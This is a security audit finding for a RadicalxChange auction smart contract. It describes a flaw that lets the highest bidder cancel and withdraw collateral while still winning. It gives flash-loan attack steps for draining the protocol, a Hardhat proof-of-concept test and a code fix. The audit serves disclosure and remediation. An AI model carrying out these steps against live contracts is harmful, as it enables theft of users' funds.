**Official Finding:** [Sherlock Submission](https://github.com/sherlock-audit/2024-02-radicalxchange-judging/issues/82)

## [H-01] Highest bidder can cancel their bid and withdraw their collateral.

## Summary

The highest bidder is normally forbidden from canceling their bid. However, due to a vulnerability, they can cancel and withdraw their bid while still remaining the highest bidder and winning the auction. This allows an attacker to win an auction by only paying the fee amount and then withdrawing their collateral amount. This vulnerability also leads to an incorrect collateral calculation within the protocol, which will drain the protocol's funds.

## Vulnerability Detail

The highest bidder is prevented from calling the `cancelBid()` function, which would call the `_cancelBid()` function and revert with the following check at https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L393-L396?plain=1 :

```solidity
require(
    bidder != l.highestBids[tokenId][round].bidder,
    'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'
);
```

However, this same check is not implemented in `_cancelAllBids()`. This means the highest bidder is able to call `cancelAllBidsAndWithdrawCollateral()` to cancel their bid, withdraw their collateral, and still be the highest bidder.

Attack scenario will go as follows:

1. The attacker calls `placeBid()` on an auction with a very high amount of ether to ensure they are the highest bidder. Flashloans can be used to increase the impact of this attack.
2. The attacker calls `cancelAllBidsAndWithdrawCollateral()` to get their collateral back but remain the highest bidder.
3. The attacker calls `closeAuction()` and becomes the owner of the Steward License token.

A more dangerous attack scenario exists as well:

1. The attacker is the current steward of the Steward License token.
2. The attacker uses flashloans with another address (let's call it address2) they own to place a very high bid on the auction using the `placeBid()` function.
3. The attacker calls `cancelAllBidsAndWithdrawCollateral()` on address2 to ensure they withdraw their collateral minus the fee amount and remain the highest bidder.
4. The attacker calls `closeAuction()`, and address2 becomes the new Steward License token owner.
5. The `closeAuction()` function adds the bid amount to the attacker's (old steward's) collateral with the following line at https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L496-L501?plain=1 :

```solidity
} else if (
    l.highestBids[tokenId][currentAuctionRound].bidder != oldBidder
) {
    // Transfer bid to previous bidder's collateral
    l.availableCollateral[oldBidder] += l.highestBids[tokenId][currentAuctionRound].bidAmount;
```

6. The attacker calls `withdrawCollateral()` to withdraw the high amount of collateral they now own, completely draining the protocol of its funds.

## PoC

Add the following test in `EnglishPeriodicAuction.ts`:

```javascript
describe('cancelBid', function () {
	it.only('will not revert if highest bidder cancels and withdraws', async function () {
      // Auction start: Now - 200
      // Auction end: Now + 100
      const instance = await getInstance({
        auctionLengthSeconds: 300,
        initialPeriodStartTime: (await time.latest()) - 200,
        licensePeriod: 1000,
      });
      const licenseMock = await ethers.getContractAt(
        'NativeStewardLicenseMock',
        instance.address,
      );

      const bidAmount = ethers.utils.parseEther('1.1');
      const feeAmount = await instance.calculateFeeFromBid(bidAmount);
      const collateralAmount = feeAmount.add(bidAmount);

      const bidAmount2 = ethers.utils.parseEther('1.2');
      const feeAmount2 = await instance.calculateFeeFromBid(bidAmount2);
      const collateralAmount2 = feeAmount2.add(bidAmount2);
      
      //bid with both accounts.
      await instance.connect(bidder1).placeBid(0, bidAmount, { value: collateralAmount }); 
      await instance.connect(bidder2).placeBid(0, bidAmount2, { value: collateralAmount2 });
      //bidder2 balance after placing bid.
      const oldBidderBalance = await ethers.provider.getBalance(bidder2.address,);
      //bidder2 cancels bid and withdraws while highest bidder.
      await expect(instance.connect(bidder2).cancelAllBidsAndWithdrawCollateral(0),).to.not.be.revertedWith('EnglishPeriodicAuction: Cannot cancel bid if highest bidder',);
      
      const highestBid = await instance['highestBid(uint256)'](0);
      //will not revert if bidder2 is the highest bidder.
      expect(highestBid.bidder).to.be.equal(bidder2.address);
      expect(highestBid.bidAmount).to.be.equal(bidAmount2);
      expect(highestBid.feeAmount).to.be.equal(feeAmount2);
      expect(highestBid.collateralAmount).to.be.equal(collateralAmount2);
      //close auction
      await time.increase(300);
      await instance.connect(bidder2).closeAuction(0);
      //check owner of tokenId = 0 after auction is closed.
      const ownerOfToken = await licenseMock.ownerOf(0);
      //will not revert if bidder2 is the owner of tokenId = 0.
      expect(await ownerOfToken).to.be.equal(bidder2.address);
      //print balances of bidder2 after placing a bid and after cancelling their bid and withdrawing.
      const newBidderBalance = await ethers.provider.getBalance(bidder2.address,);
      console.log(`Old bidder2 balance: ${ethers.utils.formatEther(oldBidderBalance)} - New bidder2 balance ${ethers.utils.formatEther(newBidderBalance)}`)
    });
```

Running the test will show that the attacker withdraws their token and gets their balances back. They will still be the highest bidder and become the owner of the Steward License token.

## Impact

The attacker will be the highest bidder and therefore become the owner of the token while only having paid a fee amount. The old steward's `l.availableCollateral` will be increased by the amount of collateral that was already withdrawn from the system by the attacker. This means that when the old steward calls `withdrawCollateral()`, they will be draining the protocol of its funds. This vulnerability will leave the protocol in a bankrupt state and will not allow any more users to withdraw their collateral.

## Code Snippet

https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L416-L434?plain=1

```solidity
function _cancelAllBids(uint256 tokenId, address bidder) internal {
    EnglishPeriodicAuctionStorage.Layout
        storage l = EnglishPeriodicAuctionStorage.layout();

    uint256 currentAuctionRound = l.currentAuctionRound[tokenId];

    for (uint256 i = 0; i <= currentAuctionRound; i++) {
        Bid storage bid = l.bids[tokenId][i][bidder];

        if (bid.collateralAmount > 0) {
            // Make collateral available to withdraw
            l.availableCollateral[bidder] += bid.collateralAmount;

            // Reset collateral and bid
            bid.collateralAmount = 0;
            bid.bidAmount = 0;
        }
    }
}
```

## Tool used

Manual Review, Hardhat

## Recommendation

Change `_cancelAllBids` function as follows:

```solidity
function _cancelAllBids(uint256 tokenId, address bidder) internal {
    EnglishPeriodicAuctionStorage.Layout
        storage l = EnglishPeriodicAuctionStorage.layout();

    uint256 currentAuctionRound = l.currentAuctionRound[tokenId];

    for (uint256 i = 0; i <= currentAuctionRound; i++) {
        Bid storage bid = l.bids[tokenId][i][bidder];

        if (bid.collateralAmount > 0) {
            //call _cancelBid
            _cancelBid(tokenId, i, bidder);
        }
    }
}
```
